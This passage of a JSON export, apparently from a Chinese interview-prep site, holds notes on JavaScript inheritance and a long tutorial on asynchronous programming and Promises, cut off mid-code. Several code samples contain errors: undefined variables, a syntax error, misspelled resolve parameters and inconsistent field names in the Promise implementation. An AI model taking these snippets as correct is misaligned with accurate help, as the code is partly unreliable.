**构造函数继承**：通过在子类构造函数中调用父类构造函数，复制父类的实例属性给子类。这种方式解决了原型链继承中子类实例共享父类引用属性的问题，但无法继承父类的原型属性和方法。\n   * **组合继承**：结合了原型链继承和构造函数继承的优点，既可以实现属性的继承，又可以实现方法的继承。但这种方式在子类中调用了两遍父类，可能会影响性能。\n   * **原型式继承**：直接通过父对象创建子对象，使用Object.create实现原型继承。这种方式会导致多个子对象之间共享一个原型对象。\n   * **寄生式继承**：在原型式继承的基础上新增了更多方法。这种方式同样会导致多个子对象共享一个对象。\n   * **寄生组合式继承**：基于组合继承的方式，使用Object.create()代理new的原型链继承实现。这种方式是目前主流的继承方式，它解决了组合继承中子类调用两遍父类的问题。\n\n3. **继承的实现**：\n\n   * 熟练掌握各种继承方式的实现方法，并能够根据具体需求选择合适的继承方式。\n   * 了解不同继承方式的优缺点，以便在开发中做出合理的选择。\n",
    "exerciseKeyList": "[\"818064e8-137a-4499-81f5-554f4890fb55\",\"32a74e6c-fc06-4f61-b3c4-95a7760157a6\",\"1a143475-08ab-49cc-abc9-62a4bb9249c0\",\"d1bb4169-cd53-4398-b4a1-5e0c533c87dc\",\"9b19862a-b226-4a56-95d4-5ab4b05024bb\",\"21144fa1-41b7-4077-97cd-b0c6030b10e0\",\"c591d4b9-eff8-4a29-b01b-50130bde5d3b\"]",
    "vipLimit": 0,
    "level": 3,
    "pointOrder": 10,
    "createAt": "2024-10-01T12:27:22.000Z",
    "updateAt": "2024-11-08T14:40:48.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "1a143475-08ab-49cc-abc9-62a4bb9249c0",
        "title": "如何获取到一个实例对象的原型对象？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-04-05T09:28:08.000Z",
        "updateAt": "2022-04-05T17:28:16.000Z"
      },
      {
        "exerciseKey": "21144fa1-41b7-4077-97cd-b0c6030b10e0",
        "title": "Javascript如何实现继承？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:50:49.000Z",
        "updateAt": "2025-09-08T00:30:19.000Z"
      },
      {
        "exerciseKey": "32a74e6c-fc06-4f61-b3c4-95a7760157a6",
        "title": "原型链的终点是什么？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:26.000Z",
        "updateAt": "2024-08-23T05:17:17.000Z"
      },
      {
        "exerciseKey": "818064e8-137a-4499-81f5-554f4890fb55",
        "title": "解释一下原型、构造函数、实例、原型链 之间的关系？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:45.000Z",
        "updateAt": "2024-08-14T14:08:13.000Z"
      },
      {
        "exerciseKey": "9b19862a-b226-4a56-95d4-5ab4b05024bb",
        "title": "ES5怎么实现继承",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-03-27T14:25:19.000Z",
        "updateAt": "2024-08-10T17:06:23.000Z"
      },
      {
        "exerciseKey": "c591d4b9-eff8-4a29-b01b-50130bde5d3b",
        "title": "使用哪个构造函数可以成功继承 Dog 类?",
        "category": "Choice",
        "vipLimit": 0,
        "createAt": "2021-07-02T15:33:04.000Z",
        "updateAt": "2024-08-03T21:05:37.000Z"
      },
      {
        "exerciseKey": "d1bb4169-cd53-4398-b4a1-5e0c533c87dc",
        "title": "JavaScript中的原型，原型链分别是什么? ",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:50:21.000Z",
        "updateAt": "2024-08-10T17:04:30.000Z"
      }
    ]
  },
  "17": {
    "id": 17,
    "tagId": 10,
    "title": "异步编程",
    "explanation": "浏览器中的JavaScript程序是典型的事件驱动型程序，即它们会等待用户触发后才真正的执行，而基于的JavaScript的服务器通常要等待客户端通过网络发送请求，然后才能执行。这种异步编程在JavaScript是很常见的，下面就来介绍几个异步编程的重要特性，它们可以使编写异步代码更容易。\n\n本文将按照异步编程方式的出现时间来归纳整理： ![image.png](https://static.ecool.fun//article/63afc05a-7360-47c2-9a7e-af355899fa96.jpeg)\n\n## 一、什么是异步\n\n下面先来看看同步和异步的概念：\n\n-   **同步：** 在执行某段代码时，在没有得到返回结果之前，其他代码暂时是无法执行的，但是一旦执行完成拿到返回值，即可执行其他代码。也就是说，在此段代码执行完未返回结果之前，会阻塞之后的代码执行，这样的情况称为同步。\n-   **异步：** 当某一代码执行异步过程调用发出后，这段代码不会立刻得到返回结果。而是在异步调用发出之后，一般通过回调函数处理这个调用之后拿到结果。异步调用发出后，不会影响阻塞后面的代码执行，这样的情况称为异步。\n\n下面来看一个例子：\n\n```javascript\n// 同步\nfunction syncAdd(a, b) {\n  return a + b;\n}\n\nsyncAdd(1, 2) // 立即得到结果：3\n\n// 异步\nfunction asyncAdd(a, b) {\n  setTimeout(function() {\n    console.log(a + b);\n  }, 1000)\n}\n\nasyncAdd(1, 2) // 1s后打印结果：3\n```\n\n这里定义了同步函数 syncAdd 和异步函数 asyncAdd，调用 syncAdd(1, 2) 函数时会等待得到结果之后再执行后面的代码。而调用 asyncAdd(1, 2) 时则会在得到结果之前继续执行，直到 1 秒后得到结果并打印。\n\n我们知道，JavaScript 是单线程的，如果代码同步执行，就可能会造成阻塞；而如果使用异步则不会阻塞，不需要等待异步代码执行的返回结果，可以继续执行该异步任务之后的代码逻辑。因此，在 JavaScript 编程中，会大量使用异步。\n\n那为什么单线程的JavaScript还能实现异步呢，其实也没有什么魔法，只是把一些操作交给了其他线程处理，然后采用了**事件循环**的机制来处理返回结果。\n\n## 二、回调函数\n\n在最基本的层面上，JavaScript的异步编程式通过回调实现的。回调的是函数，可以传给其他函数，而其他函数会在满足某个条件时调用这个函数。下面就来看看常见的不同形式的基于回调的异步编程。\n\n### 1\\. 定时器\n\n一种最简单的异步操作就是在一定时间之后运行某些代码。如下面代码：\n\n```javascript\nsetTimeout(asyncAdd(1, 2), 8000)\n```\n\n`setTimeout()`方法的第一个参数是一个函数，第二个参数是以毫秒为单位的时间间隔。`asyncAdd()`方法可能是一个回调函数，而`setTimeout()`方法就是注册回调函数的函数。它还代指在什么异步条件下调用回调函数。`setTimeout()`方法只会调用一次回调函数。\n\n### 2\\. 事件监听\n\n给目标 DOM 绑定一个监听函数，用的最多的是 `addEventListener`：\n\n```javascript\ndocument.getElementById('#myDiv').addEventListener('click', (e) => {\n  console.log('我被点击了')\n}, false);\n```\n\n通过给 id 为 `myDiv` 的一个元素绑定了点击事件的监听函数，把任务的执行时机推迟到了点击这个动作发生时。此时，**任务的执行顺序与代码的编写顺序无关，只与点击事件有没有被触发有关**。\n\n这里使用`addEventListener`注册了回调函数，这个方法的第一个参数是一个字符串，指定要注册的事件类型，如果用户点击了指定的元素，浏览器就会调用回调函数，并给他传入一个对象，其中包含着事件的详细信息。\n\n### 3\\. 网络请求\n\nJavaScript中另外一种常见的异步操作就是网络请求：\n\n```javascript\nconst SERVER_URL = \"/server\";\nlet xhr = new XMLHttpRequest();\n// 创建 Http 请求\nxhr.open(\"GET\", SERVER_URL, true);\n// 设置状态监听函数\nxhr.onreadystatechange = function() {\n  if (this.readyState !== 4) return;\n  // 当请求成功时\n  if (this.status === 200) {\n    handle(this.response);\n  } else {\n    console.error(this.statusText);\n  }\n};\n// 设置请求失败时的监听函数\nxhr.onerror = function() {\n  console.error(this.statusText);\n};\n// 发送 Http 请求\nxhr.send(null);\n```\n\n这里使用`XMLHttpRequest`类及回调函数来发送HTTP请求并异步处理服务器返回的响应。\n\n### 4\\. Node中的回调与事件\n\nNode.js服务端JavaScript环境底层就是异步的，定义了很多使用回调和事件的API。例如读取文件默认的API就是异步的，它会在读取文件内容之后调用一个回调函数：\n\n```javascript\nconst fs = require('fs');\nlet options = {}\n\n//  读取配置文件，调用回调函数\nfs.readFile('config.json', 'utf8', (err, data) => {\n    if(err) {\n      throw err;\n    }else{\n    \tObject.assign(options, JSON.parse(data))\n    }\n\t\tstartProgram(options)\n});\n```\n\n`fs.readFile()`方法以接收两个参数的回调作为最后一个参数。它会异步读取指定文件，如果读取成功就会将第二个参数传递给回调的第二个参数，如果发生错误，就会将错误传递给回调的第一个参数。\n\n## 三、Promise\n\n### 1\\. Promise的概念\n\nPromise是一种为简化异步编程而设计的核心语言特性，它是一个对象，表示异步操作的结果。在最简单的情况下，Promise就是一种处理回调的不同方式。不过，使用Promise也有实际的用处，基于回调的异步编程会有一个很现实的问题，那就是**经常出现回调多层嵌套**的情况，会造成代码难以理解。Promise可以让这种嵌套回调以一种更线性的链式形式表达出来，因此更容易阅读和理解。\n\n回调的另一个问题就是**难以处理错误，** 如果一个异步函数抛出异常，则该异常没有办法传播到异步操作的发起者。异步编程的一个基本事实就是它破坏了异常处理。而Promise则标准化了异步错误处理，通过Promise链提供一种让错误正确传播的途经。\n\n实际上，Promise就是一个容器，里面保存着某个未来才会结束的事件（通常是异步操作）的结果。从语法上说，Promise 是一个对象，它可以获取异步操作的消息。Promise 提供了统一的 API，各种异步操作都可以用同样的方法进行处理。\n\n（1）Promise实例有**三个状态**:\n\n-   pending 状态：表示进行中。Promise 实例创建后的初始态；\n-   fulfilled 状态：表示成功完成。在执行器中调用 resolve 后达成的状态；\n-   rejected 状态：表示操作失败。在执行器中调用 reject 后达成的状态。\n\n（2）Promise实例有**两个过程**：\n\n-   pending -> fulfilled : Resolved（已完成）；\n-   pending -> rejected：Rejected（已拒绝）。\n\n**Promise的特点：**\n\n-   一旦状态改变就不会再变，promise对象的状态改变，只有两种可能：从`pending`变为`fulfilled`，从`pending`变为`rejected`。当 Promise 实例被创建时，内部的代码就会立即被执行，而且无法从外部停止。比如无法取消超时或消耗性能的异步调用，容易导致资源的浪费；\n-   如果不设置回调函数，Promise内部抛出的错误，不会反映到外部；\n-   Promise 处理的问题都是“一次性”的，因为一个 Promise 实例只能 resolve 或 reject 一次，所以面对某些需要持续响应的场景时就会变得力不从心。比如上传文件获取进度时，默认采用的就是事件监听的方式来实现。\n\n下面来看一个例子：\n\n```javascript\nconst https = require('https');\n\nfunction httpPromise(url){\n  return new Promise((resolve,reject) => {\n    https.get(url, (res) => {\n      resolve(data);\n    }).on(\"error\", (err) => {\n      reject(error);\n    });\n  })\n}\n\nhttpPromise().then((data) => {\n  console.log(data)\n}).catch((error) => {\n  console.log(error)\n})\n```\n\n可以看到，Promise 会接收一个执行器，在这个执行器里，需要把目标异步任务给放进去。在 Promise 实例创建后，执行器里的逻辑会立刻执行，在执行的过程中，根据异步返回的结果，决定如何使用 resolve 或 reject 来改变 Promise实例的状态。\n\n在这个例子里，当用 resolve 切换到了成功态后，Promise 的逻辑就会走到 then 中传入的方法里去；用 reject 切换到失败态后，Promise 的逻辑就会走到 catch 传入的方法中。\n\n这样的逻辑，本质上与回调函数中的成功回调和失败回调没有差异。但这种写法大大地提高了代码的质量。当我们进行大量的异步链式调用时，回调地狱不复存在了。取而代之的是层级简单、赏心悦目的 Promise 调用链：\n\n```javascript\nhttpPromise(url1)\n    .then(res => {\n        console.log(res);\n        return httpPromise(url2);\n    })\n    .then(res => {\n        console.log(res);\n        return httpPromise(url3);\n    })\n    .then(res => {\n      console.log(res);\n      return httpPromise(url4);\n    })\n    .then(res => console.log(res));\n```\n\n### 2\\. Promise的创建\n\nPromise对象代表一个异步操作，有三种状态：pending（进行中）、fulfilled（已成功）和rejected（已失败）。\n\nPromise构造函数接受一个函数作为参数，该函数的两个参数分别是`resolve`和`reject`。\n\n```javascript\nconst promise = new Promise((resolve, reject) => {\n  if (/* 异步操作成功 */){\n    resolve(value);\n  } else {\n    reject(error);\n  }\n});\n```\n\n一般情况下，我们会用`new Promise()`来创建Promise对象。除此之外，还也可以使用`promise.resolve`和 `promise.reject`这两个方法来创建：\n\n**（1）Promise.resolve** `Promise.resolve(value)`的返回值是一个promise对象，我们可以对返回值进行.then调用，如下代码：\n\n```javascript\nPromise.resolve(11).then(function(value){\n  console.log(value); // 打印出11\n});\n```\n\n`resolve(11)`会让promise对象进入确定(`resolve`状态)，并将参数`11`传递给后面`then`中指定的`onFulfilled` 函数；\n\n**（2）Promise.reject** `Promise.reject` 的返回值也是一个promise对象，如下代码：\n\n```javascript\nPromise.reject(new Error(\"我错了！\"));\n```\n\n上面是以下代码的简单形式：\n\n```javascript\nnew Promise((resolve, reject) => {\n   reject(new Error(\"我错了！\"));\n});\n```\n\n下面来综合看看resolve方法和reject方法：\n\n```javascript\nfunction testPromise(ready) {\n  return new Promise(resolve,reject) => {\n    if(ready) {\n      resolve(\"hello world\");\n    }else {\n      reject(\"No thanks\");\n    }\n  });\n};\n\ntestPromise(true).then((msg) => {\n  console.log(msg);\n},(error) => {\n  console.log(error);\n});\n```\n\n上面的代码给`testPromise`方法传递一个参数，返回一个promise对象，如果为`true`，那么调用Promise对象中的`resolve()`方法，并且把其中的参数传递给后面的`then`第一个函数内，因此打印出 “`hello world`”, 如果为`false`，会调用promise对象中的`reject()`方法，则会进入`then`的第二个函数内，会打印`No thanks`。\n\n### 3\\. Promise的作用\n\n在开发中可能会碰到这样的需求：使用ajax发送A请求，成功后拿到数据，需要把数据传给B请求，那么需要这样编写代码：\n\n```javascript\nlet fs = require('fs')\nfs.readFile('./a.txt','utf8',function(err,data){\n  fs.readFile(data,'utf8',function(err,data){\n    fs.readFile(data,'utf8',function(err,data){\n      console.log(data)\n    })\n  })\n})\n```\n\n这段代码之所以看上去很乱，归结其原因有两点：\n\n-   **第一是嵌套调用**，下面的任务依赖上个任务的请求结果，并**在上个任务的回调函数内部执行新的业务逻辑**，这样当嵌套层次多了之后，代码的可读性就变得非常差了。\n-   **第二是任务的不确定性**，执行每个任务都有两种可能的结果（成功或者失败），所以体现在代码中就需要对每个任务的执行结果做两次判断，这种对每个任务都要进行一次额外的错误处理的方式，明显增加了代码的混乱程度。\n\n既然原因分析出来了，那么问题的解决思路就很清晰了：\n\n-   消灭嵌套调用；\n-   合并多个任务的错误处理。\n\n这么说可能有点抽象，不过 Promise 解决了这两个问题。接下来就看看 Promise 是怎么消灭嵌套调用和合并多个任务的错误处理的。\n\n`Promise`出现之后，代码可以这样写：\n\n```javascript\nlet fs = require('fs')\nfunction read(url){\n  return new Promise((resolve,reject)=>{\n    fs.readFile(url,'utf8',function(error,data){\n      error && reject(error)\n      resolve(data)\n    })\n  })\n}\nread('./a.txt').then(data=>{\n  return read(data) \n}).then(data=>{\n  return read(data)  \n}).then(data=>{\n  console.log(data)\n})\n```\n\n通过引入 Promise，上面这段代码看起来就非常线性了，也非常符合人的直觉。Promise 利用了三大技术手段来解决回调地狱：**回调函数延迟绑定、返回值穿透、错误冒泡。**\n\n下面来看一段代码：\n\n```javascript\nlet readFilePromise = (filename) => {\n  fs.readFile(filename, (err, data) => {\n    if(err) {\n      reject(err);\n    }else {\n      resolve(data);\n    }\n  })\n}\nreadFilePromise('1.json').then(data => {\n  return readFilePromise('2.json')\n});\n```\n\n可以看到，回调函数不是直接声明的，而是通过后面的 then 方法传入的，即延迟传入，这就是回调函数延迟绑定。接下来针对上面的代码做一下调整，如下：\n\n```javascript\nlet x = readFilePromise('1.json').then(data => {\n  return readFilePromise('2.json')  //这是返回的Promise\n});\nx.then()\n```\n\n根据 then 中回调函数的传入值创建不同类型的 Promise，然后把返回的 Promise 穿透到外层，以供后续的调用。这里的 x 指的就是内部返回的 Promise，然后在 x 后面可以依次完成链式调用。这便是返回值穿透的效果，这两种技术一起作用便可以将深层的嵌套回调写成下面的形式。\n\n```javascript\nreadFilePromise('1.json').then(data => {\n    return readFilePromise('2.json');\n}).then(data => {\n    return readFilePromise('3.json');\n}).then(data => {\n    return readFilePromise('4.json');\n});\n```\n\n这样就显得清爽许多，更重要的是，它更符合人的线性思维模式，开发体验更好，两种技术结合产生了链式调用的效果。\n\n这样解决了多层嵌套的问题，那另外一个问题，即每次任务执行结束后分别处理成功和失败的情况怎么解决的呢？Promise 采用了错误冒泡的方式。下面来看效果：\n\n```javascript\nreadFilePromise('1.json').then(data => {\n    return readFilePromise('2.json');\n}).then(data => {\n    return readFilePromise('3.json');\n}).then(data => {\n    return readFilePromise('4.json');\n}).catch(err => {\n  // xxx\n})\n```\n\n这样前面产生的错误会一直向后传递，被 catch 接收到，就不用频繁地检查错误了。从上面的这些代码中可以看到，Promise 解决效果也比较明显：实现链式调用，解决多层嵌套问题；实现错误冒泡后一站式处理，解决每次任务中判断错误、增加代码混乱度的问题。\n\n### 4\\. Promise的方法\n\nPromise常用的方法：then()、catch()、all()、race()、finally()、allSettled()、any()。\n\n#### （1）then()\n\n当Promise执行的内容符合成功条件时，调用`resolve`函数，失败就调用`reject`函数。那Promise创建完了，该如何调用呢？这时就该then出场了：\n\n```javascript\npromise.then(function(value) {\n  // success\n}, function(error) {\n  // failure\n});\n```\n\n`then`方法接受两个回调函数作为参数。第一个回调函数是Promise对象的状态变为`resolved`时调用，第二个回调函数是Promise对象的状态变为`rejected`时调用。其中第二个参数可以省略。\n\n`then`方法返回的是一个新的Promise实例。因此可以采用**链式写法**，即`then`方法后面再调用另一个then方法。当写有顺序的异步事件时，需要串行时，可以这样写：\n\n```javascript\nlet promise = new Promise((resolve,reject)=>{\n    ajax('first').success(function(res){\n        resolve(res);\n    })\n})\npromise.then(res=>{\n    return new Promise((resovle,reject)=>{\n        ajax('second').success(function(res){\n            resolve(res)\n        })\n    })\n}).then(res=>{\n    return new Promise((resovle,reject)=>{\n        ajax('second').success(function(res){\n            resolve(res)\n        })\n    })\n}).then(res=>{\n    \n})\n```\n\n#### （2）catch()\n\nPromise对象的catch方法相当于`then`方法的第二个参数，指向`reject`的回调函数。\n\n不过`catch`方法还有一个作用，就是在执行`resolve`回调函数时，如果出现错误，抛出异常，不会停止运行，而是进入`catch`方法中：\n\n```javascript\np.then((data) => {\n     console.log('resolved',data);\n},(err) => {\n     console.log('rejected',err);\n}); \n```\n\n#### （3）all()\n\n`all`方法可以完成**并行任务**， 它接收一个数组，数组的每一项都是一个`promise`对象。当数组中所有的`promise`的状态都达到`resolved`时，`all`方法的状态就会变成`resolved`，如果有一个状态变成了`rejected`，那么`all`方法的状态就会变成`rejected`：\n\n```javascript\nlet promise1 = new Promise((resolve,reject)=>{\n\tsetTimeout(()=>{\n       resolve(1);\n\t},2000)\n});\nlet promise2 = new Promise((resolve,reject)=>{\n\tsetTimeout(()=>{\n       resolve(2);\n\t},1000)\n});\nlet promise3 = new Promise((resolve,reject)=>{\n\tsetTimeout(()=>{\n       resolve(3);\n\t},3000)\n});\n\nPromise.all([promise1,promise2,promise3]).then(res=>{\n    console.log(res);  //结果为：[1,2,3] \n})\n```\n\n调用`all`方法时的结果成功的时候是回调函数的参数也是一个数组，这个数组按顺序保存着每一个promise对象`resolve`执行时的值。\n\n#### （4）race()\n\n`race`方法和`all`一样，接受的参数是一个每项都是`promise`的数组，但与`all`不同的是，当最先执行完的事件执行完之后，就直接返回该`promise`对象的值。\n\n如果第一个`promise`对象状态变成`resolved`，那自身的状态变成了`resolved`；反之，第一个`promise`变成`rejected`，那自身状态就会变成`rejected`。\n\n```javascript\nlet promise1 = new Promise((resolve,reject) => {\n\tsetTimeout(() =>  {\n       reject(1);\n\t},2000)\n});\nlet promise2 = new Promise((resolve,reject) => {\n\tsetTimeout(() => {\n       resolve(2);\n\t},1000)\n});\nlet promise3 = new Promise((resolve,reject) => {\n\tsetTimeout(() => {\n       resolve(3);\n\t},3000)\n});\nPromise.race([promise1,promise2,promise3]).then(res => {\n\tconsole.log(res); //结果：2\n},rej => {\n    console.log(rej)};\n)\n```\n\n那么`race`方法有什么实际作用呢？当需要执行一个任务，超过多长时间就不做了，就可以用这个方法来解决：\n\n```javascript\nPromise.race([promise1, timeOutPromise(5000)]).then(res => console.log(res))\n```\n\n#### （5）finally()\n\n`finally`方法用于指定不管 Promise 对象最后状态如何，都会执行的操作。该方法是 ES2018 引入标准的。\n\n```javascript\npromise.then(result => {···})\n\t\t\t .catch(error => {···})\n       .finally(() => {···});\n```\n\n上面代码中，不管`promise`最后的状态如何，在执行完`then`或`catch`指定的回调函数以后，都会执行`finally`方法指定的回调函数。\n\n下面来看例子，服务器使用 Promise 处理请求，然后使用`finally`方法关掉服务器。\n\n```javascript\nserver.listen(port)\n  .then(function () {\n    // ...\n  })\n  .finally(server.stop);\n```\n\n`finally`方法的回调函数不接受任何参数，这意味着没有办法知道，前面的 Promise 状态到底是`fulfilled`还是`rejected`。这表明，`finally`方法里面的操作，应该是与状态无关的，不依赖于 Promise 的执行结果。\n\n`finally`本质上是`then`方法的特例：\n\n```javascript\npromise\n.finally(() => {\n  // 语句\n});\n\n// 等同于\npromise\n.then(\n  result => {\n    // 语句\n    return result;\n  },\n  error => {\n    // 语句\n    throw error;\n  }\n);\n```\n\n上面代码中，如果不使用`finally`方法，同样的语句需要为成功和失败两种情况各写一次。有了`finally`方法，则只需要写一次。\n\n#### （6）allSettled()\n\nPromise.allSettled 的语法及参数跟 Promise.all 类似，其参数接受一个 Promise 的数组，返回一个新的 Promise。唯一的不同在于，执行完之后不会失败，也就是说当 Promise.allSettled 全部处理完成后，我们可以拿到每个 Promise 的状态，而不管其是否处理成功。\n\n下面使用 allSettled 实现的一段代码：\n\n```javascript\nconst resolved = Promise.resolve(2);\nconst rejected = Promise.reject(-1);\nconst allSettledPromise = Promise.allSettled([resolved, rejected]);\nallSettledPromise.then(function (results) {\n  console.log(results);\n});\n// 返回结果：\n// [\n//    { status: 'fulfilled', value: 2 },\n//    { status: 'rejected', reason: -1 }\n// ]\n```\n\n可以看到，Promise.allSettled 最后返回的是一个数组，记录传进来的参数中每个 Promise 的返回值，这就是和 all 方法不太一样的地方。你也可以根据 all 方法提供的业务场景的代码进行改造，其实也能知道多个请求发出去之后，Promise 最后返回的是每个参数的最终状态。\n\n#### （7）any()\n\nany 方法返回一个 Promise，只要参数 Promise 实例有一个变成 fullfilled 状态，最后 any 返回的实例就会变成 fullfilled 状态；如果所有参数 Promise 实例都变成 rejected 状态，包装实例就会变成 rejected 状态。\n\n下面对上面 allSettled 这段代码进行改造，来看下改造完的代码和执行结果：\n\n```javascript\nconst resolved = Promise.resolve(2);\nconst rejected = Promise.reject(-1);\nconst allSettledPromise = Promise.any([resolved, rejected]);\nallSettledPromise.then(function (results) {\n  console.log(results);\n});\n// 返回结果：2\n```\n\n可以看出，只要其中一个 Promise 变成 fullfilled 状态，那么 any 最后就返回这个 Promise。由于上面 resolved 这个 Promise 已经是 resolve 的了，故最后返回结果为 2。\n\n### 5\\. Promise的异常处理\n\n错误处理是所有编程范型都必须要考虑的问题，在使用 JavaScript 进行异步编程时，也不例外。如果我们不做特殊处理，会怎样呢？来看下面的代码，先定义一个必定会失败的方法\n\n```javascript\nlet fail = () => {\n    setTimeout(() => {\n\tthrow new Error(\"fail\");\n    }, 1000);\n};\n```\n\n调用：\n\n```javascript\nconsole.log(1);\ntry {\n    fail();\n} catch (e) {\n    console.log(\"captured\");\n}\nconsole.log(2);\n```\n\n可以看到打印出了 1 和 2，并在 1 秒后，获得一个“Uncaught Error”的错误打印，注意观察这个错误的堆栈：\n\n```javascript\nUncaught Error: fail\n    at <anonymous>:3:9\n```\n\n可以看到，其中的 setTimeout (async) 这样的字样，表示着这是一个异步调用抛出的堆栈。但是，captured”这样的字样也并未打印，因为母方法 fail() 本身的原始顺序执行并没有失败，这个异常的抛出是在回调行为里发生的。 从上面的例子可以看出，对于异步编程来说，我们需要使用一种更好的机制来捕获并处理可能发生的异常。\n\nPromise 除了支持 resolve 回调以外，还支持 reject 回调，前者用于表示异步调用顺利结束，而后者则表示有异常发生，中断调用链并将异常抛出：\n\n```javascript\nconst exe = (flag) => () => new Promise((resolve, reject) => {\n    console.log(flag);\n    setTimeout(() => {\n        flag ? resolve(\"yes\") : reject(\"no\");\n    }, 1000);\n});\n```\n\n上面的代码中，flag 参数用来控制流程是顺利执行还是发生错误。在错误发生的时候，no 字符串会被传递给 reject 函数，进一步传递给调用链：\n\n```javascript\nPromise.resolve()\n       .then(exe(false))\n       .then(exe(true));\n```\n\n上面的调用链，在执行的时候，第二行就传入了参数 false，它就已经失败了，异常抛出了，因此第三行的 exe 实际没有得到执行，执行结果如下：\n\n```javascript\nfalse\nUncaught (in promise) no\n```\n\n这就说明，通过这种方式，调用链被中断了，下一个正常逻辑 exe(true) 没有被执行。 但是，有时候需要捕获错误，而继续执行后面的逻辑，该怎样做？这种情况下就要在调用链中使用 catch 了：\n\n```javascript\nPromise.resolve()\n       .then(exe(false))\n       .catch((info) => { console.log(info); })\n       .then(exe(true));\n```\n\n这种方式下，异常信息被捕获并打印，而调用链的下一步，也就是第四行的 exe(true) 可以继续被执行。将看到这样的输出：\n\n```javascript\nfalse\nno\ntrue\n```\n\n### 6\\. Promise的实现\n\n这一部分就来简单实现一下Promise及其常用的方法。\n\n#### （1）Promise\n\n```javascript\nconst PENDING = \"pending\";\nconst RESOLVED = \"resolved\";\nconst REJECTED = \"rejected\";\n\nfunction MyPromise(fn) {\n  // 保存初始化状态\n  var self = this;\n\n  // 初始化状态\n  this.state = PENDING;\n\n  // 用于保存 resolve 或者 rejected 传入的值\n  this.value = null;\n\n  // 用于保存 resolve 的回调函数\n  this.resolvedCallbacks = [];\n\n  // 用于保存 reject 的回调函数\n  this.rejectedCallbacks = [];\n\n  // 状态转变为 resolved 方法\n  function resolve(value) {\n    // 判断传入元素是否为 Promise 值，如果是，则状态改变必须等待前一个状态改变后再进行改变\n    if (value instanceof MyPromise) {\n      return value.then(resolve, reject);\n    }\n\n    // 保证代码的执行顺序为本轮事件循环的末尾\n    setTimeout(() => {\n      // 只有状态为 pending 时才能转变，\n      if (self.state === PENDING) {\n        // 修改状态\n        self.state = RESOLVED;\n\n        // 设置传入的值\n        self.value = value;\n\n        // 执行回调函数\n        self.resolvedCallbacks.forEach(callback => {\n          callback(value);\n        });\n      }\n    }, 0);\n  }\n\n  // 状态转变为 rejected 方法\n  function reject(value) {\n    // 保证代码的执行顺序为本轮事件循环的末尾\n    setTimeout(() => {\n      // 只有状态为 pending 时才能转变\n      if (self.state === PENDING) {\n        // 修改状态\n        self.state = REJECTED;\n\n        // 设置传入的值\n        self.value = value;\n\n        // 执行回调函数\n        self.rejectedCallbacks.forEach(callback => {\n          callback(value);\n        });\n      }\n    }, 0);\n  }\n\n  // 将两个方法传入函数执行\n  try {\n    fn(resolve, reject);\n  } catch (e) {\n    // 遇到错误时，捕获错误，执行 reject 函数\n    reject(e);\n  }\n}\n\nMyPromise.prototype.then = function(onResolved, onRejected) {\n  // 首先判断两个参数是否为函数类型，因为这两个参数是可选参数\n  onResolved =\n    typeof onResolved === \"function\"\n      ? onResolved\n      : function(value) {\n          return value;\n        };\n\n  onRejected =\n    typeof onRejected === \"function\"\n      ? onRejected\n      : function(error) {\n          throw error;\n        };\n\n  // 如果是等待状态，则将函数加入对应列表中\n  if (this.state === PENDING) {\n    this.resolvedCallbacks.push(onResolved);\n    this.rejectedCallbacks.push(onRejected);\n  }\n\n  // 如果状态已经凝固，则直接执行对应状态的函数\n\n  if (this.state === RESOLVED) {\n    onResolved(this.value);\n  }\n\n  if (this.state === REJECTED) {\n    onRejected(this.value);\n  }\n};\n```\n\n#### （2）Promise.then\n\n`then` 方法返回一个新的 `promise` 实例，为了在 `promise` 状态发生变化时（`resolve` / `reject` 被调用时）再执行 `then` 里的函数，我们使用一个 `callbacks` 数组先把传给then的函数暂存起来，等状态改变时再调用。\n\n**那么，怎么保证后一个 `then` 里的方法在前一个 `then`（可能是异步）结束之后再执行呢？**\n\n可以将传给 `then` 的函数和新 `promise` 的 `resolve` 一起 `push` 到前一个 `promise` 的 `callbacks` 数组中，达到承前启后的效果：\n\n-   承前：当前一个 `promise` 完成后，调用其 `resolve` 变更状态，在这个 `resolve` 里会依次调用 `callbacks` 里的回调，这样就执行了 `then` 里的方法了\n-   启后：上一步中，当 `then` 里的方法执行完成后，返回一个结果，如果这个结果是个简单的值，就直接调用新 `promise` 的 `resolve`，让其状态变更，这又会依次调用新 `promise` 的 `callbacks` 数组里的方法，循环往复。。如果返回的结果是个 `promise`，则需要等它完成之后再触发新 `promise` 的 `resolve`，所以可以在其结果的 `then` 里调用新 `promise` 的 `resolve`\n\n```javascript\nthen(onFulfilled, onReject){\n    // 保存前一个promise的this\n    const self = this; \n    return new MyPromise((resolve, reject) => {\n      // 封装前一个promise成功时执行的函数\n      let fulfilled = () => {\n        try{\n          const result = onFulfilled(self.value); // 承前\n          return result instanceof MyPromise? result.then(resolve, reject) : resolve(result); //启后\n        }catch(err){\n          reject(err)\n        }\n      }\n      // 封装前一个promise失败时执行的函数\n      let rejected = () => {\n        try{\n          const result = onReject(self.reason);\n          return result instanceof MyPromise? result.then(resolve, reject) : reject(result);\n        }catch(err){\n          reject(err)\n        }\n      }\n      switch(self.status){\n        case PENDING: \n          self.onFulfilledCallbacks.push(fulfilled);\n          self.onRejectedCallbacks.push(rejected);\n          break;\n        case FULFILLED:\n          fulfilled();\n          break;\n        case REJECT:\n          rejected();\n          break;\n      }\n    })\n   }\n```\n\n**注意：**\n\n-   连续多个 `then` 里的回调方法是同步注册的，但注册到了不同的 `callbacks` 数组中，因为每次 `then` 都返回新的 `promise` 实例（参考上面的例子和图）\n-   注册完成后开始执行构造函数中的异步事件，异步完成之后依次调用 `callbacks` 数组中提前注册的回调\n\n#### （3）Promise.all\n\n该方法的参数是 Promise 的实例数组, 然后注册一个 then 方法。 待数组中的 Promise 实例的状态都转为 fulfilled 之后则执行 then 方法.，这里主要就是一个计数逻辑, 每当一个 Promise 的状态变为 fulfilled 之后就保存该实例返回的数据, 然后将计数减一, 当`计数器`变为 `0` 时, 代表数组中所有 Promise 实例都执行完毕.\n\n```javascript\nPromise.all = function (arr) {\n  let args = Array.prototype.slice.call(arr)\n  return new Promise(function (resolve, reject) {\n    if (args.length === 